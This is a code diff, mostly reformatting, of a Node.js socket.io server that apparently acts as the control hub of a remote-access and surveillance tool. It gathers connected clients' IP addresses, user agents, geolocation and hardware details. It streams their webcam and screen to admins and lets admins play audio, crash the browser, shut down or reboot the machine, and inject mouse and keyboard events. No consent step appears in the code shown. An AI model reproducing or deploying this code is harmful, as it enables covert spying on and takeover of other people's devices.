@@ -226,79 +226,69 @@ function emit(uuid,evt,data){
 function timed(uuid,evt,data,delay){ setTimeout(()=>emit(uuid,evt,data),delay*1000); }
 
 /* ─── conexões socket.io ─── */
-io.on('connection', socket => {
+io.on('connection', socket=>{
   const role = socket.handshake.query.role;
-  const lab  = socket.handshake.query.lab;
+  const lab  = (socket.handshake.query.lab || 'DEFAULT').toUpperCase();
 
-  if (role === 'client') {
+  if(role === 'client'){
     const id = uuid();
     const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
     const ua = socket.handshake.headers['user-agent'] || '—';
 
-    clients.set(id, {
-      uuid: id, ip, ua, lab,
-      connected_at: Date.now(),
-      socket, watchers: [], screenWatchers: [],
-      location: null, hwinfo: null
+    clients.set(id,{
+      uuid:id, ip, ua, lab,
+      connected_at:Date.now(),
+      socket, watchers:[], screenWatchers:[],
+      location:null, hwinfo:null
     });
 
     socket.emit('id', id);
     broadcastClients();
 
-    socket.on('frame',        d => relay(id, 'frame', d, 'watchers'));
-    socket.on('screen-frame', d => relay(id, 'screen-frame', d, 'screenWatchers'));
+    socket.on('frame',        d=> relay(id,'frame',d,'watchers'));
+    socket.on('screen-frame', d=> relay(id,'screen-frame',d,'screenWatchers'));
 
-    socket.on('location', loc => {
-      const c = clients.get(id);
-      if (c) {
-        c.location = loc;
-        io.to('lab:' + lab).emit('location-update', { uuid: id, loc });
-      }
+    socket.on('location', loc=>{
+      const c=clients.get(id); if(c){ c.location=loc; io.to('lab:'+lab).emit('location-update',{uuid:id,loc}); }
     });
 
-    socket.on('hwinfo', info => {
-      const c = clients.get(id);
-      if (c) {
-        c.hwinfo = info;
-        broadcastClients();
-        io.to('lab:' + lab).emit('hwinfo-update', { uuid: id, info });
-      }
+    socket.on('hwinfo', info=>{
+      const c=clients.get(id); if(c){ c.hwinfo=info; broadcastClients(); io.to('lab:'+lab).emit('hwinfo-update',{uuid:id,info}); }
     });
 
-    socket.on('disconnect', () => {
-      clients.delete(id);
-      broadcastClients();
-    });
+    socket.on('disconnect', ()=>{ clients.delete(id); broadcastClients(); });
+  }
 
-  } else if (role === 'admin') {
+  if(role === 'admin'){
     socket.data.lab = lab;
-    socket.join('lab:' + lab);
+    socket.join('lab:'+lab);
     socket.emit('clients', summary(lab));
 
-    socket.on('request-stream',  uuid => addWatcher(uuid, socket.id, 'watchers', lab));
-    socket.on('stop-stream',     uuid => delWatcher(uuid, socket.id, 'watchers'));
-    socket.on('request-screen',  uuid => addWatcher(uuid, socket.id, 'screenWatchers', lab));
-    socket.on('stop-screen',     uuid => delWatcher(uuid, socket.id, 'screenWatchers'));
+    socket.on('request-stream', uuid=> addWatcher(uuid,socket.id,'watchers',lab));
+    socket.on('stop-stream',    uuid=> delWatcher(uuid,socket.id,'watchers'));
 
-    socket.on('ready-audio',     ({ uuid, url, delay = 0 }) => timed(uuid, 'play-audio', { url }, delay));
-    socket.on('custom-audio',    ({ uuid, dataURL, delay = 0 }) => timed(uuid, 'play-audio', { url: dataURL }, delay));
-    socket.on('stop-audio',      uuid => emit(uuid, 'stop-audio'));
-    socket.on('crash-browser',   uuid => emit(uuid, 'crash-browser'));
-    socket.on('request-hwinfo',  uuid => emit(uuid, 'request-hwinfo'));
-    socket.on('shutdown',        uuid => emit(uuid, 'shutdown'));
-    socket.on('reboot',          uuid => emit(uuid, 'reboot'));
-    socket.on('mouse-event',     ({ uuid, ev }) => emit(uuid, 'mouse-event', ev));
-    socket.on('key-event',       ({ uuid, ev }) => emit(uuid, 'key-event', ev));
+    socket.on('request-screen', uuid=> addWatcher(uuid,socket.id,'screenWatchers',lab));
+    socket.on('stop-screen',    uuid=> delWatcher(uuid,socket.id,'screenWatchers'));
 
-    socket.on('disconnect', () => {
-      for (const c of clients.values()) {
-        c.watchers = c.watchers.filter(x => x !== socket.id);
-        c.screenWatchers = c.screenWatchers.filter(x => x !== socket.id);
+    socket.on('ready-audio',  ({uuid,url,delay=0})=> timed(uuid,'play-audio',{url},delay));
+    socket.on('custom-audio', ({uuid,dataURL,delay=0})=> timed(uuid,'play-audio',{url:dataURL},delay));
+    socket.on('stop-audio',   uuid=> emit(uuid,'stop-audio'));
+
+    socket.on('crash-browser', uuid=> emit(uuid,'crash-browser'));
+    socket.on('request-hwinfo',uuid=> emit(uuid,'request-hwinfo'));
+    socket.on('shutdown',      uuid=> emit(uuid,'shutdown'));
+    socket.on('reboot',        uuid=> emit(uuid,'reboot'));
+    socket.on('mouse-event',   ({uuid,ev})=> emit(uuid,'mouse-event',ev));
+    socket.on('key-event',     ({uuid,ev})=> emit(uuid,'key-event',ev));
+
+    socket.on('disconnect',()=>{
+      for(const c of clients.values()){
+        c.watchers       = c.watchers.filter(x=>x!==socket.id);
+        c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);
       }
     });
   }
 });
-
 
 /* ─── iniciar servidor ─── */
 server.listen(PORT, ()=> console.log(`✔  http://localhost:${PORT}`));
